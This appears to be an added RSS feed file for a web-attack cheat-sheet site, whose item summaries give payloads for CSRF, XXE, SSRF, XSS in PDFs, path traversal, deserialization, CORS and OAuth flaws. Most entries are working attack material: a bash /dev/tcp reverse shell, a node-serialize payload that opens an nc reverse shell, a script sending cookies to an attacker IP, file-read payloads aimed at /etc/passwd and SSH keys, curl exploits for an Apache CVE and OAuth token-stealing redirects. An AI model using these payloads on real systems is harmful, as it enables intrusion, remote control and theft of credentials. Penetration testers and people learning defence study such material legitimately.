+      <description>Account Takeover linkIf the victim user access to the page where the payload put in, the victim account information will be changed to the attacker&amp;rsquo;s information e.g. Email address or Username.&#xA;&amp;lt;form method=&amp;#34;POST&amp;#34; action=&amp;#34;https://example.com/change-email&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;email&amp;#34; value=&amp;#34;attacker@attack.com&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; document.forms[0].submit(); &amp;lt;/script&amp;gt; CSRF Token Bypass linkBelow is to bypass CSRF token by using another CSRF token that we get.&#xA;&amp;lt;form method=&amp;#34;POST&amp;#34; action=&amp;#34;https://example.com/change-email&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;email&amp;#34; value=&amp;#34;attacker@attack.com&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;csrf&amp;#34; value=&amp;#34;PqORuKZMr9zIJxpZC2cA8BgHuQGVkW8h&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; document.</description>
+    </item>
+    <item>
+      <title>PHP Filters Chain</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/php-filters-chain/</link>
+      <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/php-filters-chain/</guid>
+      <description>Exploitation linkPHP Filter Chain Generator is available so we can use it.&#xA;python3 php_filter_chain_generator.py --chain &amp;#39;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#39; We only have to do is paste the above generated payload to /?page=&amp;lt;genrated_chain&amp;gt;.&#xA;Reverse Shell linkFirst create a shell script named &amp;ldquo;revshell&amp;rdquo; in local machine.&#xA;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 Then create a chain using a generator.&#xA;Replace the ip address with your own.&#xA;# `&amp;lt;?= ?&amp;gt;` is a shorthand for `&amp;lt;?php echo ~ ?</description>
+    </item>
+    <item>
+      <title>XXE (XML External Entity)</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/xxe/</link>
+      <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xxe/</guid>
+      <description>Read Files link &amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE root [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;config&amp;gt;&amp;lt;location&amp;gt;&amp;amp;xxe;&amp;lt;/location&amp;gt;&amp;lt;/config&amp;gt; &amp;lt;!-- URL parameter (URL encode) --&amp;gt; https://vulnerable.com/set?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E PHP Filter link &amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=/etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;config&amp;gt;&amp;lt;location&amp;gt;&amp;amp;xxe;&amp;lt;/location&amp;gt;&amp;lt;/config&amp;gt; Remote Code Execution link &amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE root [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;expect://whoami&amp;#34;&amp;gt;]&amp;gt; &amp;lt;config&amp;gt;&amp;lt;location&amp;gt;&amp;amp;xxe;&amp;lt;/location&amp;gt;&amp;lt;/config&amp;gt; &amp;lt;!-- URL parameter (URL encode) --&amp;gt; https://vulnerable.com/set?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E SSRF attack link &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://sub.vulnerable.com/admin&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; Also we can use the Blind XXE for exfiltrating data.</description>
+    </item>
+    <item>
+      <title>wkhtmltopdf SSRF</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/wkhtmltopdf-ssrf/</link>
+      <pubDate>Sat, 08 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/wkhtmltopdf-ssrf/</guid>
+      <description>Exploitation linkCreate a PHP payload to read local file.&#xA;&amp;lt;?php header(&amp;#39;location:file://&amp;#39;.$_REQUEST[&amp;#39;x&amp;#39;]); ?&amp;gt; Then start web server in local machine.&#xA;php -S 0.0.0.0:8000 Send request to where wkhtmltopdf is affected. For example,&#xA;/htmltopdf?item=&amp;lt;iframe src=http://10.0.0.1:8000/test.php?x=/etc/passwd width=1000px height=1000px&amp;gt;&amp;lt;/iframe&amp;gt; Now we can see the system users list via a generated PDF.</description>
+    </item>
+    <item>
+      <title>XSS with Dynamic PDF</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/xss-with-dynamic-pdf/</link>
+      <pubDate>Sat, 01 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xss-with-dynamic-pdf/</guid>
+      <description>Basic link &amp;lt;img src=&amp;#39;x&amp;#39; onerror=&amp;#34;document.write(&amp;#39;test&amp;#39;)&amp;#34;&amp;gt; &amp;lt;script&amp;gt;document.write(&amp;#39;test&amp;#39;)&amp;lt;/script&amp;gt; &amp;#34;&amp;gt;&amp;lt;h1&amp;gt;XSS&amp;lt;/h1&amp;gt; Path Disclosure link &amp;lt;img src=&amp;#39;x&amp;#39; onerror=&amp;#34;document.write(JSON.stringify(window.location))&amp;#34;&amp;gt; &amp;lt;script&amp;gt;document.write(&amp;#39;&amp;lt;iframe src=\&amp;#34;&amp;#39; &amp;#43; window.location.href &amp;#43; &amp;#39;\&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;#39;)&amp;lt;/script&amp;gt; LFI/RFI link &amp;lt;iframe src=&amp;#34;file:///etc/passwd&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=file:///etc/passwd width=1000px height=1000px&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=file:///var/www/html/index.php width=1000px height=1000px&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=&amp;#34;http://localhost:3000/index.html&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=&amp;#34;http://localhost/server-status&amp;#34; height=&amp;#34;1000&amp;#34; width=&amp;#34;1000&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;img src=&amp;#39;x&amp;#39; onerror=&amp;#34;document.write(&amp;#39;&amp;lt;iframe src=file:///etc/passwd&amp;gt;&amp;lt;/iframe&amp;gt;&amp;#39;)&amp;#34;&amp;gt; LFI/RFI (XHR request) link &amp;lt;script&amp;gt; x = new XMLHttpRequest(); x.onload = function() { document.write(this.responseText) }; x.open(&amp;#34;GET&amp;#34;, &amp;#34;file:///etc/passwd&amp;#34;); x.send(); &amp;lt;/script&amp;gt; Cookie Hijacking link &amp;lt;img src=x onerror=&amp;#34;location.href=&amp;#39;http://10.0.0.1/?cookie=&amp;#39;&amp;#43; document.cookie&amp;#34;&amp;gt; External Scripts link &amp;lt;script src=&amp;#34;http://attacker.</description>
+    </item>
+    <item>
+      <title>Directory (Path) Traversal</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/directory-traversal/</link>
+      <pubDate>Sat, 11 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/directory-traversal/</guid>
+      <description>/?file=index.php /?file=index.html /?file=/etc/passwd /?file=../../../etc/passwd /?file=../../../../etc/passwd /?file=../../../../../etc/passwd /?file=..//..//..//..//etc/passwd /?file=....//....//....//etc/passwd /?file=....//....//....//....//etc/passwd # URL encode /?file=..%252f..%252f..%252fetc/passwd /?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd # URL double encode /?file=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd /?file=/var/www/images/../../../etc/passwd /?file=/etc/passwd%00.png /?file=../../../etc/passwd%00.png /?file=....//....//....//etc/passwd%00.png /?file=..%252f..%252f..%252fetc/passwd%00.png /?file=/var/www/images/../../../etc/passwd%00.png # Hostfile /?file=/etc/hosts # SSH keys /?file=../../../../../home/&amp;lt;username&amp;gt;/.ssh/authorized_keys /?file=../../../../../home/&amp;lt;username&amp;gt;/.ssh/id_rsa # Web root in the developer&amp;#39;s home /?file=../../../../home/&amp;lt;username&amp;gt;/app/app.py # PHP web application /index.php/../ /index.php/..;/ /index.php/%2e%2e;/ # Windows /?file=..\..\..\windows\win.ini Apache 2.4.49 (CVE-2021-41773) link # without CGI enabled curl -v &amp;#39;https://example.com/cgi-bin/../../../../../../../../../../etc/passwd&amp;#39; curl -v &amp;#39;https://example.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd&amp;#39; curl -v &amp;#39;https://example.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&amp;#39; # with CGI enabled curl -v &amp;#39;http://example.</description>
+    </item>
+    <item>
+      <title>PHP Object Injection</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/php-object-injection/</link>
+      <pubDate>Thu, 09 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/php-object-injection/</guid>
+      <description>Investigation linkBelow is an example of an index.php in PHP web application.&#xA;&amp;lt;?php class Example { public $file = &amp;#39;example.txt&amp;#39;; public $msg = &amp;#39;Hello World&amp;#39;; public function SomeFunc() { // Some code ... } public function __destruct() { file_put_contents(__DIR__ . &amp;#39;/&amp;#39; . $this-&amp;gt;file,$this-&amp;gt;msg,FILE_APPEND); } } $data = unserialize($_GET[&amp;#39;data&amp;#39;]); // Some code ... ?&amp;gt; This code adds a text file named example.txt, that contains &amp;ldquo;Hello World&amp;rdquo; strings, into the web root directory.</description>
+    </item>
+    <item>
+      <title>JSON.NET Deserialization</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/json-net-deserialization/</link>
+      <pubDate>Wed, 08 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/json-net-deserialization/</guid>
+      <description>Investigation linkWe can decompile .dll files using ILSpy in Windows. If you like to use ILSpy in Linux, use AvaloniaILSpy.&#xA;json = JsonConvert.DeserializeObject&amp;lt;Example&amp;gt;(json); If the application uses “JsonConvert.DeserializeObject” function, we can abuse JSON object and execute arbitrary code or read local files.&#xA;Exploitation linkWe can give the Json value to the “JsonConvert.DeserializeObject(json)” with a reserved key ($type).&#xA;The format is as follow. The value of $type is a string that contains the assembly-qualified name of the .</description>
+    </item>
+    <item>
+      <title>Insecure Deserialization</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/insecure-deserialization/</link>
+      <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/insecure-deserialization/</guid>
+      <description>PHP Gadget Chains linkPHPGGC linkPHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically.&#xA;phpggc -l Ysoserial linkYsoserial is a proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.</description>
+    </item>
+    <item>
+      <title>CORS (Cross-Origin Resource Sharing) Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/cors-attack/</link>
+      <pubDate>Thu, 09 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/cors-attack/</guid>
+      <description>Origin Reflection link1. Change Origin Value of Request Header link Origin: https://attacker.com Origin: https://vulnerable.com.attacker.com 2. Check if the Response Allowing Cross-Origin linkIt&amp;rsquo;s reflected the previous reqeust in the response header, you can exploit it.&#xA;Access-Control-Allow-Origin: https://attacker.com Access-Control-Allow-Origin: https://vulnerable.com.attacker.com Access-Control-Allow-Credentials: true 3. Exploit with Your Malicious Web Page linkFor example, it&amp;rsquo;s hosted as &amp;ldquo;https://attacker.com/exploit&#34; or &amp;ldquo;https://vulnerable.com.attacker.com/exploit&#34;.&#xA;Add the JavaScript code in the web page.&#xA;It shows the users&amp;rsquo; sensitive information of the target website in your server&amp;rsquo;s log.</description>
+    </item>
+    <item>
+      <title>Node.js Deserialization Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/nodejs-deserialization-attack/</link>
+      <pubDate>Mon, 02 Jan 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/nodejs-deserialization-attack/</guid>
+      <description>Cookie Reverse Shell link1. Generate a Payload linkWe can use the online tools like RunKit to execute the node package.&#xA;If you want to do in your local environment, you need to install a npm package first.&#xA;mkdir test cd test npm install node-serialize Next, create the payload for serialization to execute a reverse shell.&#xA;For instance, the file is named “serialize.js”.&#xA;let y = { rce: function() { require(&amp;#39;child_process&amp;#39;).exec(&amp;#39;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc &amp;lt;local-ip&amp;gt; &amp;lt;local-port&amp;gt; &amp;gt;/tmp/f&amp;#39;, function(error, stdout, stderr) { console.</description>
+    </item>
+    <item>
+      <title>CRLF (Carriage Return Line Feed) Injection</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/crlf-injection/</link>
+      <pubDate>Mon, 26 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/crlf-injection/</guid>
+      <description>No content yet.</description>
+    </item>
+    <item>
+      <title>XST (Cross-Site Tracing)</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/xst/</link>
+      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xst/</guid>
+      <description>Add Cookie Header link TRACE / HTTP/1.1 ... Cookie: name=value ... </description>
+    </item>
+    <item>
+      <title>OAuth Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/oauth-attack/</link>
+      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/oauth-attack/</guid>
+      <description>Change User Info link POST /authenticate HTTP/1.1 ... { &amp;#34;email&amp;#34;:&amp;#34;victim@example.com&amp;#34;, &amp;#34;username&amp;#34;:&amp;#34;attacker&amp;#34;, &amp;#34;token&amp;#34;:&amp;#34;b7Gl7Xoy...&amp;#34; } Steal Tokens link Open Web Server in Your Local Machine&#xA;python3 -m http.server 8000 Inject Your Local URL to the Redirect URL&#xA;Access to the URL below.&#xA;https://vulnerable.com/oauth?redirect_url=http://&amp;lt;attacker-ip&amp;gt;:8000/login&amp;amp;response_type=token&amp;amp;scope=all CSRF link Steal Code&#xA;&amp;lt;iframe src=&amp;#34;https://vulnerable.com/oauth-linking?code=kZ7bfFa...&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; Hijack redirect_url&#xA;&amp;lt;iframe src=&amp;#34;https://vulnerable.com/auth?client_id=ysdj...&amp;amp;redirect_uri=https://attacker.com&amp;amp;response_type=code&amp;amp;scope=openid%20profile%20email&amp;#34;&amp;gt; &amp;lt;/iframe&amp;gt; Open Redirect&#xA;&amp;lt;script&amp;gt; if (!document.location.hash) { window.location = &amp;#39;https://vulnerable.com/auth?client_id=7Fdx8a...&amp;amp;redirect_uri=https://vulnerable.com/oauth-callback/../post/next?path=https://attacker.com/exploit/&amp;amp;response_type=token&amp;amp;nonce=398...&amp;amp;scope=openid%20profile%20email&amp;#39; } else { window.location = &amp;#39;/?&amp;#39;&amp;#43;document.location.hash.substr(1) } &amp;lt;/script&amp;gt; Proxy Page (postMessage)</description>
+    </item>
+  </channel>
+</rss>
